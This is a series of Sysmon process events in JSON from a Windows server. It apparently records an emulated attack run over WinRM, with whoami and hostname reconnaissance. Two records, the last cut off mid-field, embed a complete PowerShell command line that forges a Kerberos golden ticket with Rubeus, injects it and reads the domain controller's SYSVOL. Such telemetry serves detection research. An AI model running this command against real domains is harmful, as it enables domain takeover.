{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:21.8888847"},"EventRecordID":"17977","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:21.885"},{"@Name":"ProcessGuid","#text":"dbf410b3-c280-671e-ca00-000000003900"},{"@Name":"ProcessId","#text":"4400"},{"@Name":"Image","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:21.8914143"},"EventRecordID":"17978","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:21.885"},{"@Name":"ProcessGuid","#text":"dbf410b3-c280-671e-cb00-000000003900"},{"@Name":"ProcessId","#text":"2352"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}


{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.0367483"},"EventRecordID":"17981","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.022"},{"@Name":"ProcessGuid","#text":"dbf410b3-c281-671e-cc00-000000003900"},{"@Name":"ProcessId","#text":"3980"},{"@Name":"Image","#text":"C:\\Windows\\System32\\wevtutil.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.0393280"},"EventRecordID":"17982","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.022"},{"@Name":"ProcessGuid","#text":"dbf410b3-c281-671e-cd00-000000003900"},{"@Name":"ProcessId","#text":"5236"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}


{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.0993974"},"EventRecordID":"17985","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.086"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-ce00-000000003900"},{"@Name":"ProcessId","#text":"5584"},{"@Name":"Image","#text":"C:\\Windows\\System32\\wevtutil.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.1028143"},"EventRecordID":"17986","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.100"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-cf00-000000003900"},{"@Name":"ProcessId","#text":"5576"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}


{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.2009988"},"EventRecordID":"17989","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.194"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d000-000000003900"},{"@Name":"ProcessId","#text":"2440"},{"@Name":"Image","#text":"C:\\Windows\\System32\\wevtutil.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.2076826"},"EventRecordID":"17990","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.194"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d100-000000003900"},{"@Name":"ProcessId","#text":"2512"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}


{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.2874009"},"EventRecordID":"17993","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.265"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d200-000000003900"},{"@Name":"ProcessId","#text":"6892"},{"@Name":"Image","#text":"C:\\Windows\\System32\\wevtutil.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.2902248"},"EventRecordID":"17994","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.288"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d300-000000003900"},{"@Name":"ProcessId","#text":"4476"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}


{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.3509108"},"EventRecordID":"17997","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.335"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d400-000000003900"},{"@Name":"ProcessId","#text":"4100"},{"@Name":"Image","#text":"C:\\Windows\\System32\\wevtutil.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.3539844"},"EventRecordID":"17998","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.335"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d500-000000003900"},{"@Name":"ProcessId","#text":"6980"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.4011739"},"EventRecordID":"17999","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.398"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d600-000000003900"},{"@Name":"ProcessId","#text":"6368"},{"@Name":"Image","#text":"C:\\Windows\\System32\\HOSTNAME.EXE"},{"@Name":"FileVersion","#text":"10.0.19041.1 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Hostname APP"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"hostname.exe"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\HOSTNAME.EXE\""},{"@Name":"CurrentDirectory","#text":"C:\\Users\\admin_test\\Documents\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c273-671e-598d-130000000000"},{"@Name":"LogonId","#text":"0x138D59"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=A90C3FB350A11C6F6A6EFA9607987D924D1DE65E09CA9FAF2E0E0E00531EE335"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c274-671e-ba00-000000003900"},{"@Name":"ParentProcessId","#text":"3832"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\wsmprovhost.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.4065084"},"EventRecordID":"18000","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.403"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d700-000000003900"},{"@Name":"ProcessId","#text":"5928"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c273-671e-598d-130000000000"},{"@Name":"LogonId","#text":"0x138D59"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c282-671e-d600-000000003900"},{"@Name":"ParentProcessId","#text":"6368"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\HOSTNAME.EXE"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\HOSTNAME.EXE\""},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.4530063"},"EventRecordID":"18001","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.444"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d600-000000003900"},{"@Name":"ProcessId","#text":"6368"},{"@Name":"Image","#text":"C:\\Windows\\System32\\HOSTNAME.EXE"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.4589539"},"EventRecordID":"18002","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.444"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d700-000000003900"},{"@Name":"ProcessId","#text":"5928"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.4593196"},"EventRecordID":"18003","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.456"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d800-000000003900"},{"@Name":"ProcessId","#text":"6672"},{"@Name":"Image","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"FileVersion","#text":"10.0.19041.1 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"whoami - displays logged on user information"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"whoami.exe"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\whoami.exe\""},{"@Name":"CurrentDirectory","#text":"C:\\Users\\admin_test\\Documents\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c273-671e-598d-130000000000"},{"@Name":"LogonId","#text":"0x138D59"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c274-671e-ba00-000000003900"},{"@Name":"ParentProcessId","#text":"3832"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\wsmprovhost.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.4654746"},"EventRecordID":"18004","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.462"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d900-000000003900"},{"@Name":"ProcessId","#text":"6124"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c273-671e-598d-130000000000"},{"@Name":"LogonId","#text":"0x138D59"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c282-671e-d800-000000003900"},{"@Name":"ParentProcessId","#text":"6672"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\whoami.exe\""},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.5179402"},"EventRecordID":"18005","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.506"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d800-000000003900"},{"@Name":"ProcessId","#text":"6672"},{"@Name":"Image","#text":"C:\\Windows\\System32\\whoami.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.5207725"},"EventRecordID":"18006","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.506"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-d900-000000003900"},{"@Name":"ProcessId","#text":"6124"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.6448500"},"EventRecordID":"18007","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.634"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-da00-000000003900"},{"@Name":"ProcessId","#text":"6560"},{"@Name":"Image","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"FileVersion","#text":"10.0.19041.3996 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Windows PowerShell"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"PowerShell.EXE"},{"@Name":"CommandLine","#text":"\"powershell.exe\" &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore, Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore, cmd.exe /c \\\"\"$Env:temp\\rubeus.exe\\\"\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \\\"\".\\\"\" + \\\"\"$ENV:userdnsdomain\\\"\") /printcmd /outfile:golden, $filename = (Get-ChildItem | ? {$_.Name.startswith(\\\"\"golden_\\\"\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name, # create batch file with commands to run in a separate \\\"\"runas /netonly\\\"\" session, # so we don't purge Kerberos ticket from the current Windows session, # its output goes to golden.txt temp file, because we cannot capture \\\"\"runas /netonly\\\"\" output otherwise, @\\\"\", &gt;%%TEMP%%\\golden.txt 2&gt;&amp;1 (,   echo Purge existing tickets and create golden ticket:,   klist purge,   cd %%temp%%,   \\\"\"$Env:temp\\rubeus.exe\\\"\" ptt /ticket:kirbifile,   echo.,   echo Requesting SYSVOL:,   dir \\\\$($ENV:logonserver.TrimStart('\\') + \\\"\".\\\"\" + \\\"\"$ENV:userdnsdomain\\\"\")\\SYSVOL,   ,   echo.,   echo Tickets after requesting SYSVOL:,   klist,   echo.,   echo End of Golden Ticket attack, ), \\\"\"@ -Replace \\\"\"kirbifile\\\"\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat, # run batch file in a new empty session (password and username do not matter), echo \\\"\"foo\\\"\" | runas /netonly /user:fake \\\"\"$env:TEMP\\golden.bat\\\"\" | Out-Null, # wait until the output file has logged the entire attack, do {,   Start-Sleep 1 # wait a bit so the output file has time to be created,   Get-Content -Path \\\"\"$env:TEMP\\golden.txt\\\"\" -Wait | ForEach-Object {,     if ($_ -match 'End of Golden Ticket attack') { break } ,   }, } while ($false) # dummy loop so that 'break' can be used, # show output from new empty session, Get-Content $env:TEMP\\golden.txt, # cleanup temp files, Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore, Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}"},{"@Name":"CurrentDirectory","#text":"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c273-671e-598d-130000000000"},{"@Name":"LogonId","#text":"0x138D59"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c274-671e-ba00-000000003900"},{"@Name":"ParentProcessId","#text":"3832"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\wsmprovhost.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\wsmprovhost.exe -Embedding"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:22.6873168"},"EventRecordID":"18008","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:22.647"},{"@Name":"ProcessGuid","#text":"dbf410b3-c282-671e-db00-000000003900"},{"@Name":"ProcessId","#text":"4428"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c273-671e-598d-130000000000"},{"@Name":"LogonId","#text":"0x138D59"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c282-671e-da00-000000003900"},{"@Name":"ParentProcessId","#text":"6560"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"ParentCommandLine","#text":"\"powershell.exe\" &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore, Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore, cmd.exe /c \\\"\"$Env:temp\\rubeus.exe\\\"\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \\\"\".\\\"\" + \\\"\"$ENV:userdnsdomain\\\"\") /printcmd /outfile:golden, $filename = (Get-ChildItem | ? {$_.Name.startswith(\\\"\"golden_\\\"\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name, # create batch file with commands to run in a separate \\\"\"runas /netonly\\\"\" session, # so we don't purge Kerberos ticket from the 